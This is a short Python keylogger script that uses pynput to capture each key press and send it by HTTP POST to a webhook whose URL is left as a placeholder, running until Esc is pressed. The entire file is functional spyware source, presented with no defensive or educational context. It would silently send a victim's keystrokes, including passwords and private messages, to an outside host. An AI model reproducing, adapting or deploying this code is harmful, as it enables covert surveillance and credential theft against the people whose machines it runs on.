import pynput
from pynput.keyboard import Key, Listener
import requests
import time

webhook = "ur webhook"

class Log:

    def __init__(self):
        self.count = 0
        self.keys = []

    def on_press(self, key):
        #print(f"'{key}' pressed")
        data = requests.post(webhook, json={'content': f"'{key}' pressed"})
    def on_release(self, key):
        if key == Key.esc:
            return False

if __name__ == "__main__":
    obj = Log()
    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
        listener.join()
